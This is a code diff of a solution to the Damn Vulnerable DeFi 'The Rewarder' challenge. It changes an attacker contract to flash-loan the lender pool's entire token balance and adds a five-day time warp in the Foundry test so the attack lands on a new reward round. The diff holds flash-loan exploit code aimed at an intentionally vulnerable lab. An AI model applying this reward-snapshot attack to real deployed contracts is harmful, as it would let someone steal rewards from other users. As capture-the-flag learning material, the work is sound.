@@ -14,12 +14,11 @@ import {FlashLoanerPool} from "../../../Contracts/the-rewarder/FlashLoanerPool.s
 
 contract AttackerContract {
     address public owner;
-    uint256 public constant TOTAL_AMOUNT_TO_FLASHLOAN = 1_000_000e18 - 1;
 
-    DamnValuableToken internal dvt;
-    FlashLoanerPool public flashLoanerPool;
-    RewardToken internal rewardToken;
-    TheRewarderPool internal theRewarderPool;
+    DamnValuableToken dvt;
+    FlashLoanerPool flashLoanerPool;
+    RewardToken rewardToken;
+    TheRewarderPool theRewarderPool;
 
     constructor(
         DamnValuableToken _dvt,
@@ -36,7 +35,8 @@ contract AttackerContract {
 
     function attack() public {
         require(msg.sender == owner, "Not Owner");
-        flashLoanerPool.flashLoan(TOTAL_AMOUNT_TO_FLASHLOAN);
+        uint256 dvtPoolBalance = dvt.balanceOf(address(flashLoanerPool));
+        flashLoanerPool.flashLoan(dvtPoolBalance);
     }
 
     function receiveFlashLoan(uint256 amountFlashLoaned) public {
@@ -133,6 +133,8 @@ contract TheRewarder is DSTest {
 
     function testRewarderExploit() public {
         /** EXPLOIT START **/
+        vm.warp(block.timestamp + 5 days);
+
         vm.startPrank(attacker);
         AttackerContract attackerContract = new AttackerContract(
             dvt,
